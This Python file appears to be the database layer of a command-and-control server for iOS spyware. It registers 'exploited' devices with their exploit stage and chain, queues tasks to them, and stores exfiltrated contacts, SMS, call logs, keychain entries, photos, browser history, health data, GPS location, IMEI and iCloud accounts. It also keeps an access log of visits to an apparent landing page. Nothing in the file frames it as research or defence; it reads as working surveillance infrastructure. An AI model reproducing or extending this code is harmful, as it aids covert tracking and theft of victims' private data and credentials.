"""数据库 CRUD 操作"""

from datetime import datetime, timedelta
from typing import List, Optional, Dict, Any
from sqlalchemy.orm import Session
from sqlalchemy import and_, or_, desc, func

import models, schemas


# ==================== 设备 CRUD ====================

def get_device(db: Session, device_uuid: str) -> Optional[models.Device]:
    """获取设备"""
    return db.query(models.Device).filter(models.Device.device_uuid == device_uuid).first()


def get_devices(db: Session, skip: int = 0, limit: int = 100) -> List[models.Device]:
    """获取设备列表"""
    return db.query(models.Device).order_by(desc(models.Device.last_seen)).offset(skip).limit(limit).all()


def get_online_devices(db: Session) -> List[models.Device]:
    """获取在线设备：最近 90 秒有心跳的 online/exploited"""
    threshold = datetime.utcnow() - timedelta(seconds=90)
    return db.query(models.Device).filter(
        models.Device.status.in_(["online", "exploited"]),
        models.Device.last_seen >= threshold
    ).order_by(desc(models.Device.last_seen)).all()



def create_device(db: Session, device: schemas.DeviceRegister, ip: str = None) -> models.Device:
    """创建设备"""
    # 转换 iOS 版本为数字
    ios_version_numeric = None
    if device.ios_version:
        try:
            parts = device.ios_version.split(".")
            major = int(parts[0]) if len(parts) > 0 else 0
            minor = int(parts[1]) if len(parts) > 1 else 0
            patch = int(parts[2]) if len(parts) > 2 else 0
            ios_version_numeric = major * 10000 + minor * 100 + patch
        except (ValueError, IndexError):
            pass
    
    db_device = models.Device(
        device_uuid=device.device_uuid,
        device_model=device.device_model,
        ios_version=device.ios_version,
        ios_version_numeric=ios_version_numeric,
        chipset=device.chipset,
        user_agent=device.user_agent,
        ip_address=ip,
        status="online",
        exploit_stage=device.exploit_stage,
        exploit_chain=device.exploit_chain,
        runtime_type=device.runtime_type,
        has_pac=device.has_pac,
        pac_integrity=device.pac_integrity,
        screen_resolution=device.screen_resolution,
        battery_level=device.battery_level,
        network_type=device.network_type,
        latitude=device.latitude,
        longitude=device.longitude,
        altitude=device.altitude,
        accuracy=device.accuracy,
        phone_number=device.phone_number,
        imei=device.imei,
        serial_number=device.serial_number,
        icloud_account=device.icloud_account,
        device_name=device.device_name,
        locale=device.locale,
        timezone=device.timezone,
        extra=device.extra,
        last_seen=datetime.utcnow()
    )
    
    db.add(db_device)
    db.commit()
    db.refresh(db_device)
    return db_device


def update_device_heartbeat(db: Session, heartbeat: schemas.DeviceHeartbeat) -> Optional[models.Device]:
    """更新设备心跳"""
    device = get_device(db, heartbeat.device_uuid)
    if not device:
        return None

    # 已 exploited 不降级为 online；除非客户端显式 offline
    new_status = heartbeat.status or "online"
    if device.status == "exploited" and new_status == "online":
        device.status = "exploited"
    else:
        device.status = new_status
    device.last_seen = datetime.utcnow()
    device.last_activity = datetime.utcnow()

    if heartbeat.battery_level is not None:
        device.battery_level = heartbeat.battery_level
    if heartbeat.exploit_stage is not None:
        device.exploit_stage = heartbeat.exploit_stage
        if heartbeat.exploit_stage in ("completed", "exploited") and not device.first_exploit_at:
            device.first_exploit_at = datetime.utcnow()
            device.status = "exploited"
    if heartbeat.extra:
        if not device.extra:
            device.extra = {}
        # SQLAlchemy JSON 可能需重新赋值
        extra = dict(device.extra or {})
        extra.update(heartbeat.extra)
        device.extra = extra

    db.commit()
    db.refresh(device)
    return device



def update_device_status(db: Session, device_uuid: str, status: str) -> Optional[models.Device]:
    """更新设备状态"""
    device = get_device(db, device_uuid)
    if not device:
        return None
    
    device.status = status
    device.last_seen = datetime.utcnow()
    
    db.commit()
    db.refresh(device)
    return device


def update_device_location(db: Session, location: schemas.DeviceLocationUpdate) -> Optional[models.Device]:
    """更新设备位置"""
    device = get_device(db, location.device_uuid)
    if not device:
        return None
    
    device.latitude = location.latitude
    device.longitude = location.longitude
    device.altitude = location.altitude
    device.accuracy = location.accuracy
    device.location_updated_at = datetime.utcnow()
    
    db.commit()
    db.refresh(device)
    return device


def delete_device(db: Session, device_uuid: str) -> bool:
    """删除设备"""
    device = get_device(db, device_uuid)
    if not device:
        return False

    # SQLite doesn't always enforce ORM cascades the way we expect across all related rows,
    # so remove dependent records explicitly before deleting the device.
    related_models = [
        models.Task,
        models.Exfil,
        models.DeviceLog,
        models.FileRecord,
        models.ContactRecord,
        models.SMSRecord,
        models.CallRecord,
        models.KeychainRecord,
        models.PhotoRecord,
        models.ClipboardRecord,
        models.AppRecord,
        models.ProcessRecord,
        models.WiFiRecord,
        models.BrowserHistoryRecord,
        models.CalendarEvent,
        models.NoteRecord,
        models.HealthRecord,
        models.CollectedData,
    ]
    for model in related_models:
        db.query(model).filter(model.device_uuid == device_uuid).delete(synchronize_session=False)

    db.delete(device)
    db.commit()
    return True


def update_device_stats(db: Session, device_uuid: str, task_completed: bool = False, exfil_size: int = 0):
    """更新设备统计"""
    device = get_device(db, device_uuid)
    if not device:
        return
    
    device.total_tasks += 1
    if task_completed:
        device.completed_tasks += 1
    else:
        device.failed_tasks += 1
    
    if exfil_size > 0:
        device.total_exfil += exfil_size
    
    db.commit()


# ==================== 任务 CRUD ====================

def create_task(db: Session, task: schemas.TaskCreate) -> models.Task:
    """创建任务"""
    db_task = models.Task(
        device_uuid=task.device_uuid,
        task_type=task.task_type,
        payload=task.payload,
        status="pending",
        priority=task.priority,
        timeout_seconds=task.timeout_seconds,
        metadata=task.metadata
    )
    
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    
    # 更新设备统计
    update_device_stats(db, task.device_uuid)
    
    return db_task


def create_batch_tasks(db: Session, batch: schemas.TaskBatchCreate) -> List[models.Task]:
    """批量创建任务"""
    tasks = []
    for device_uuid in batch.device_uuids:
        task = schemas.TaskCreate(
            device_uuid=device_uuid,
            task_type=batch.task_type,
            payload=batch.payload,
            priority=batch.priority,
            timeout_seconds=batch.timeout_seconds,
            metadata=batch.metadata
        )
        tasks.append(create_task(db, task))
    
    return tasks


def get_task(db: Session, task_id: int) -> Optional[models.Task]:
    """获取任务"""
    return db.query(models.Task).filter(models.Task.id == task_id).first()


def get_device_tasks(db: Session, device_uuid: str, skip: int = 0, limit: int = 100) -> List[models.Task]:
    """获取设备任务列表"""
    return db.query(models.Task).filter(
        models.Task.device_uuid == device_uuid
    ).order_by(desc(models.Task.created_at)).offset(skip).limit(limit).all()


def get_pending_tasks(db: Session, device_uuid: str) -> List[models.Task]:
    """获取待处理任务"""
    return db.query(models.Task).filter(
        models.Task.device_uuid == device_uuid,
        models.Task.status == "pending"
    ).order_by(desc(models.Task.priority), models.Task.created_at).all()


def update_task_status(db: Session, task_id: int, status: str, result: str = None, error_message: str = None) -> Optional[models.Task]:
    """更新任务状态"""
    task = get_task(db, task_id)
    if not task:
        return None
    
    task.status = status
    
    if status == "running" and not task.started_at:
        task.started_at = datetime.utcnow()
    elif status in ["completed", "failed", "cancelled", "timeout"]:
        task.completed_at = datetime.utcnow()
    
    if result is not None:
        task.result = result
    if error_message is not None:
        task.error_message = error_message
    
    db.commit()
    db.refresh(task)
    
    # 更新设备统计
    if status == "completed":
        update_device_stats(db, task.device_uuid, task_completed=True)
    elif status == "failed":
        update_device_stats(db, task.device_uuid, task_completed=False)
    
    return task


def delete_task(db: Session, task_id: int) -> bool:
    """删除任务"""
    task = get_task(db, task_id)
    if not task:
        return False
    
    db.delete(task)
    db.commit()
    return True


# ==================== 数据外泄 CRUD ====================

def create_exfil(db: Session, exfil: schemas.ExfilUpload, file_path: str = None) -> models.Exfil:
    """创建数据外泄记录"""
    db_exfil = models.Exfil(
        device_uuid=exfil.device_uuid,
        category=exfil.category,
        path=exfil.path,
        description=exfil.description,
        file_size=exfil.file_size,
        file_path=file_path,
        content_preview=exfil.content[:2048] if exfil.content else None,
        mime_type=exfil.mime_type,
        metadata=exfil.metadata,
        task_id=exfil.task_id
    )
    
    db.add(db_exfil)
    db.commit()
    db.refresh(db_exfil)
    
    return db_exfil


def get_exfil(db: Session, skip: int = 0, limit: int = 100) -> List[models.Exfil]:
    """获取数据外泄列表"""
    return db.query(models.Exfil).order_by(desc(models.Exfil.created_at)).offset(skip).limit(limit).all()


def get_device_exfil(db: Session, device_uuid: str, skip: int = 0, limit: int = 100) -> List[models.Exfil]:
    """获取设备数据外泄列表"""
    return db.query(models.Exfil).filter(
        models.Exfil.device_uuid == device_uuid
    ).order_by(desc(models.Exfil.created_at)).offset(skip).limit(limit).all()


def get_exfil_by_category(db: Session, category: str, skip: int = 0, limit: int = 100) -> List[models.Exfil]:
    """按类别获取数据外泄"""
    return db.query(models.Exfil).filter(
        models.Exfil.category == category
    ).order_by(desc(models.Exfil.created_at)).offset(skip).limit(limit).all()


# ==================== 日志 CRUD ====================

def create_device_log(db: Session, log: schemas.DeviceLogCreate) -> models.DeviceLog:
    """创建设备日志"""
    db_log = models.DeviceLog(
        device_uuid=log.device_uuid,
        stage=log.stage,
        status=log.status,
        message=log.message,
        elapsed_ms=log.elapsed_ms,
        metadata=log.metadata,
        log_level=log.log_level
    )
    
    db.add(db_log)
    db.commit()
    db.refresh(db_log)
    
    return db_log


def get_device_logs(db: Session, device_uuid: str, skip: int = 0, limit: int = 100) -> List[models.DeviceLog]:
    """获取设备日志"""
    return db.query(models.DeviceLog).filter(
        models.DeviceLog.device_uuid == device_uuid
    ).order_by(desc(models.DeviceLog.created_at)).offset(skip).limit(limit).all()


def get_all_logs(db: Session, skip: int = 0, limit: int = 100) -> List[models.DeviceLog]:
    """获取所有日志"""
    return db.query(models.DeviceLog).order_by(desc(models.DeviceLog.created_at)).offset(skip).limit(limit).all()


# ==================== 访问日志 CRUD ====================

def create_access_log(db: Session, ip: str, user_agent: str = "", referer: str = "", path: str = "/group.html", method: str = "POST") -> models.AccessLog:
    """创建访问日志"""
    db_log = models.AccessLog(
        ip=ip,
        user_agent=user_agent,
        referer=referer,
        path=path,
        method=method
    )
    db.add(db_log)
    db.commit()
    db.refresh(db_log)
    return db_log


def get_access_logs(db: Session, skip: int = 0, limit: int = 100) -> List[models.AccessLog]:
    """获取访问日志"""
    return db.query(models.AccessLog).order_by(desc(models.AccessLog.created_at)).offset(skip).limit(limit).all()


def get_all_access_logs_count(db: Session) -> int:
    """获取访问日志总数"""
    return db.query(models.AccessLog).count()


def delete_access_logs(db: Session, log_ids: List[int] = None) -> int:
    """删除访问日志 如果指定ID则删除指定ID 否则删除所有"""
    if log_ids:
        count = db.query(models.AccessLog).filter(models.AccessLog.id.in_(log_ids)).delete(synchronize_session=False)
    else:
        count = db.query(models.AccessLog).delete(synchronize_session=False)
    db.commit()
    return count


# ==================== 后渗透数据 CRUD ====================

def create_contact(db: Session, contact: schemas.ContactData) -> models.ContactRecord:
    """创建联系人记录"""
    db_contact = models.ContactRecord(**contact.dict())
    db.add(db_contact)
    db.commit()
    db.refresh(db_contact)
    return db_contact


def create_sms(db: Session, sms: schemas.SMSData) -> models.SMSRecord:
    """创建短信记录"""
    db_sms = models.SMSRecord(**sms.dict())
    db.add(db_sms)
    db.commit()
    db.refresh(db_sms)
    return db_sms


def create_call(db: Session, call: schemas.CallData) -> models.CallRecord:
    """创建通话记录"""
    db_call = models.CallRecord(**call.dict())
    db.add(db_call)
    db.commit()
    db.refresh(db_call)
    return db_call


def create_keychain(db: Session, keychain: schemas.KeychainData) -> models.KeychainRecord:
    """创建钥匙串记录"""
    db_keychain = models.KeychainRecord(**keychain.dict())
    db.add(db_keychain)
    db.commit()
    db.refresh(db_keychain)
    return db_keychain


def create_photo(db: Session, photo: schemas.PhotoData) -> models.PhotoRecord:
    """创建照片记录"""
    db_photo = models.PhotoRecord(**photo.dict())
    db.add(db_photo)
    db.commit()
    db.refresh(db_photo)
    return db_photo


def create_app(db: Session, app: schemas.AppData) -> models.AppRecord:
    """创建应用记录"""
    db_app = models.AppRecord(**app.dict())
    db.add(db_app)
    db.commit()
    db.refresh(db_app)
    return db_app


def create_process(db: Session, process: schemas.ProcessData) -> models.ProcessRecord:
    """创建进程记录"""
    db_process = models.ProcessRecord(**process.dict())
    db.add(db_process)
    db.commit()
    db.refresh(db_process)
    return db_process


def create_wifi(db: Session, wifi: schemas.WiFiData) -> models.WiFiRecord:
    """创建WiFi记录"""
    db_wifi = models.WiFiRecord(**wifi.dict())
    db.add(db_wifi)
    db.commit()
    db.refresh(db_wifi)
    return db_wifi


def create_browser_history(db: Session, history: schemas.BrowserHistoryData) -> models.BrowserHistoryRecord:
    """创建浏览器历史记录"""
    db_history = models.BrowserHistoryRecord(**history.dict())
    db.add(db_history)
    db.commit()
    db.refresh(db_history)
    return db_history


def create_calendar_event(db: Session, event: schemas.CalendarEventData) -> models.CalendarEvent:
    """创建日历事件"""
    db_event = models.CalendarEvent(**event.dict())
    db.add(db_event)
    db.commit()
    db.refresh(db_event)
    return db_event


def create_note(db: Session, note: schemas.NoteData) -> models.NoteRecord:
    """创建笔记记录"""
    db_note = models.NoteRecord(**note.dict())
    db.add(db_note)
    db.commit()
    db.refresh(db_note)
    return db_note


def create_health_data(db: Session, health: schemas.HealthData) -> models.HealthRecord:
    """创建健康数据"""
    db_health = models.HealthRecord(**health.dict())
    db.add(db_health)
    db.commit()
    db.refresh(db_health)
    return db_health


# ==================== 统计查询 ====================

def get_admin_stats(db: Session) -> schemas.AdminStats:
    """获取管理员统计数据"""
    # 设备统计
    total_devices = db.query(func.count(models.Device.id)).scalar()
    online_threshold = datetime.utcnow() - timedelta(seconds=60)
    online_devices = db.query(func.count(models.Device.id)).filter(
        models.Device.status == "online",
        models.Device.last_seen >= online_threshold
    ).scalar()
    offline_devices = total_devices - online_devices
    exploited_devices = db.query(func.count(models.Device.id)).filter(
        models.Device.exploit_stage == "completed"
    ).scalar()
    
    # 任务统计
    total_tasks = db.query(func.count(models.Task.id)).scalar()
    pending_tasks = db.query(func.count(models.Task.id)).filter(
        models.Task.status == "pending"
    ).scalar()
    running_tasks = db.query(func.count(models.Task.id)).filter(
        models.Task.status == "running"
    ).scalar()
    completed_tasks = db.query(func.count(models.Task.id)).filter(
        models.Task.status == "completed"
    ).scalar()
    failed_tasks = db.query(func.count(models.Task.id)).filter(
        models.Task.status == "failed"
    ).scalar()
    
    # 数据外泄统计
    total_exfil_count = db.query(func.count(models.Exfil.id)).scalar()
    total_exfil_size = db.query(func.sum(models.Exfil.file_size)).scalar() or 0
    
    # 最近数据
    recent_devices = get_devices(db, skip=0, limit=5)
    recent_tasks = db.query(models.Task).order_by(
        desc(models.Task.created_at)
    ).limit(10).all()
    recent_exfil = get_exfil(db, skip=0, limit=10)
    
    return schemas.AdminStats(
        total_devices=total_devices,
        online_devices=online_devices,
        offline_devices=offline_devices,
        exploited_devices=exploited_devices,
        total_tasks=total_tasks,
        pending_tasks=pending_tasks,
        running_tasks=running_tasks,
        completed_tasks=completed_tasks,
        failed_tasks=failed_tasks,
        total_exfil_count=total_exfil_count,
        total_exfil_size=total_exfil_size,
        recent_devices=recent_devices,
        recent_tasks=recent_tasks,
        recent_exfil=recent_exfil
    )


def get_device_data_counts(db: Session, device_uuid: str) -> Dict[str, int]:
    """获取设备各类数据数量"""
    return {
        "contacts": db.query(func.count(models.ContactRecord.id)).filter(
            models.ContactRecord.device_uuid == device_uuid
        ).scalar(),
        "sms": db.query(func.count(models.SMSRecord.id)).filter(
            models.SMSRecord.device_uuid == device_uuid
        ).scalar(),
        "calls": db.query(func.count(models.CallRecord.id)).filter(
            models.CallRecord.device_uuid == device_uuid
        ).scalar(),
        "keychains": db.query(func.count(models.KeychainRecord.id)).filter(
            models.KeychainRecord.device_uuid == device_uuid
        ).scalar(),
        "photos": db.query(func.count(models.PhotoRecord.id)).filter(
            models.PhotoRecord.device_uuid == device_uuid
        ).scalar(),
        "apps": db.query(func.count(models.AppRecord.id)).filter(
            models.AppRecord.device_uuid == device_uuid
        ).scalar(),
        "wifi_networks": db.query(func.count(models.WiFiRecord.id)).filter(
            models.WiFiRecord.device_uuid == device_uuid
        ).scalar(),
        "browser_history": db.query(func.count(models.BrowserHistoryRecord.id)).filter(
            models.BrowserHistoryRecord.device_uuid == device_uuid
        ).scalar(),
        "calendar_events": db.query(func.count(models.CalendarEvent.id)).filter(
            models.CalendarEvent.device_uuid == device_uuid
        ).scalar(),
        "notes": db.query(func.count(models.NoteRecord.id)).filter(
            models.NoteRecord.device_uuid == device_uuid
        ).scalar()
    }
